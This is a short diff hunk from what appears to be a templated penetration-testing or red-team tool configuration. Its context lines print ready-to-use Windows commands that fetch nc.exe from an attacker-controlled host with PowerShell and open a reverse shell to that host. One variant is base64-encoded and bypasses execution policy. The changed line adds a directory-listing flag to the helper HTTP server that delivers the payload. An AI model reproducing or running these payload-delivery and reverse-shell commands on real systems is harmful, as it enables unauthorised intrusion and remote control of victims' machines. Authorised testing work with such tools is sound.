@@ -17,4 +17,4 @@ content: |
   echo 'Deliver + RevShell: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/nc.exe -Outfile {{ delivery_path_windows }}\nc.exe; {{ delivery_path_windows }}\nc.exe -e cmd.exe {{ attacker_ip }} {{ shell_port }}'; \
   echo 'Deliver + RevShell (encoded): powershell.exe -ExecutionPolicy Bypass -EncodedCommand {{ ("powershell wget -uri http://" ~ attacker_ip ~ ":" ~ delivery_outbound_port ~ "/nc.exe -Outfile " ~ delivery_path_windows ~ "\\nc.exe; " ~ delivery_path_windows ~ "\\nc.exe -e cmd.exe " ~ attacker_ip ~ " " ~ shell_port) | base64_pwsh }}'; \
   echo '================================================================'; \
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
